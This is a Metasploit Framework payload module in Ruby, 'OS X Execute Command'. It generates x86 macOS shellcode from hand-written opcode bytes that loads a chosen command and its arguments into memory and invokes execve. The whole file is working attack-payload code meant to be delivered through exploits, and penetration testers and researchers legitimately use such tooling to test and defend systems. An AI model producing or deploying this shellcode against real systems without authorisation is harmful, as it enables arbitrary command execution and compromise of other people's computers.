##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


###
#
# Exec
# ----
#
# Executes an arbitrary command.
#
###
module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Osx

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'OS X Execute Command',
      'Description'   => 'Execute an arbitrary command',
      'Author'        =>
        [
          'snagg <snagg[at]openssl.it>',
          'argp <argp[at]census-labs.com>',
          'joev <joev[at]metasploit.com>'
        ],
      'License'       => BSD_LICENSE,
      'Platform'      => 'osx',
      'Arch'          => ARCH_X86
    ))

    register_options(
      [
        OptString.new('CMD',  [ true,  "The command string to execute" ]),
      ], self.class
    )
  end

  #
  # Dynamically builds the exec payload based on the user's options.
  #
  def generate_stage
    cmd_str   = datastore['CMD'] || ''
    # Split the cmd string into arg chunks
    cmd_parts = Shellwords.shellsplit(cmd_str)
    # the non-exe-path parts of the chunks need to be reversed for execve
    cmd_parts = ([cmd_parts.first] + (cmd_parts[1..-1] || []).reverse).compact
    arg_str = cmd_parts.map { |a| "#{a}\x00" }.join

    payload = ''

    # Stuff an array of arg strings into memory
    payload << "\x31\xc0"                          # xor eax, eax  (eax => 0)
    payload << Rex::Arch::X86.call(arg_str.length) # jmp over CMD_STR, stores &CMD_STR on stack
    payload << arg_str
    payload << "\x5B"                              # pop ebx (ebx => &CMD_STR)

    # now EBX contains &cmd_parts[0], the exe path
    if cmd_parts.length > 1
      # Build an array of pointers to arguments
      payload << "\x89\xD9"                     # mov ecx, ebx
      payload << "\x50"                         # push eax; null byte (end of array)
      payload << "\x89\xe2"                     # mov edx, esp (EDX points to the end-of-array null byte)

      cmd_parts[1..-1].each_with_index do |arg, idx|
        l = [cmd_parts[idx].length+1].pack('V')
        # can probably save space here by doing the loop in ASM
        # for each arg, push its current memory location on to the stack
        payload << "\x81\xC1"                 # add ecx, ...
        payload << l                          # (cmd_parts[idx] is the prev arg)
        payload << "\x51"                     # push ecx (&cmd_parts[idx])
      end

      payload << "\x53"                         # push ebx (&cmd_parts[0])
      payload << "\x89\xe1"                     # mov ecx, esp (ptr to ptr to first str)
      payload << "\x52"                         # push edx
      payload << "\x51"                         # push ecx
    else
      # pass NULL args array to execve() call
      payload << "\x50\x50"                     # push eax, push eax
    end

    payload << "\x53"                             # push ebx
    payload << "\xb0\x3b"                         # mov al, 0x3b (execve)
    payload << "\x50"                             # push eax
    payload << "\xcd\x80"                         # int 0x80 (triggers execve syscall)

    payload
  end
end
